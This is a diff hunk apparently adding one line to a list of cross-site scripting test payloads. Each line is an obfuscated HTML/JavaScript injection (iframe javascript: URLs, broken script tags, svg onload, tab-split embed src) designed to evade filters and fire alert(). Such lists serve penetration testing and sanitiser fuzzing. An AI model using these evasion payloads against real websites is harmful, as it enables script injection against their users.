@@ -5,3 +5,4 @@
 <</p>iframe src=javascript:alert()//
 <</div>script</div>>alert()<</div>/script</div>>
 %ff<!---><svg/onload=top[/al/.source+/ert/.source]&lpar;)>%ff
+<embed><embed src="jav&Tab;ascript:al&Tab;ert()"
